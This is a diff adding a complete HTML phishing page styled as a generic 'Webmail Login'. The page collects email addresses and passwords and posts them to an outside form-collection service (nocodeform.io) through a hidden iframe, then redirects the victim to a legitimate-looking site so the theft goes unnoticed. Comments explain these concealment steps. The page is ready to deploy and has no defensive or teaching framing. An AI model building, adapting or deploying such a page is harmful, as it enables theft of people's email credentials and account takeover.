@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url("https://picsum.photos/1920/1080?blur=3") no-repeat center center/cover;
+      position: relative;
+    }
+
+    /* Dark overlay */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.55);
+      z-index: 1;
+    }
+
+    .login-card {
+      position: relative;
+      z-index: 2;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .login-card h2 {
+      margin-bottom: 1.5rem;
+      color: #222;
+      font-weight: 600;
+    }
+
+    .form-group {
+      margin-bottom: 1rem;
+      text-align: left;
+    }
+
+    label {
+      font-size: 0.9rem;
+      color: #444;
+      margin-bottom: 0.3rem;
+      display: block;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.75rem;
+      border: 1px solid #ccc;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
+    }
+
+    button {
+      width: 100%;
+      padding: 0.9rem;
+      background: #3b82f6;
+      border: none;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #2563eb;
+    }
+
+    .footer {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      color: #666;
+    }
+
+    iframe.hidden-iframe {
+      display: none;
+      width: 0;
+      height: 0;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-card">
+    <h2>Webmail Login</h2>
+
+    <!-- Form submits into hidden iframe -->
+    <form id="loginForm" action="https://nocodeform.io/f/68be11afab9ed5b19dee920c" method="POST" target="hidden_iframe">
+      <div class="form-group">
+        <label for="email">Email ID</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Passwd</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+
+      <button type="submit">Log in</button>
+    </form>
+
+    <div class="footer">
+      &copy; 2025 Your Company
+    </div>
+  </div>
+
+  <!-- Hidden iframe prevents nocodeform page from showing -->
+  <iframe name="hidden_iframe" class="hidden-iframe"></iframe>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function () {
+      // Redirect after submission
+      setTimeout(() => {
+        window.location.href = "https://your-website.com/";
+      }, 300);
+    });
+
+    // If we are on your-website.com, auto-return back to the login page (this same file)
+    if (window.location.hostname === "your-website.com") {
+      setTimeout(() => {
+        window.location.href = document.referrer || window.location.origin + window.location.pathname;
+      }, 3000);
+    }
+  </script>
+
+</body>
+</html>
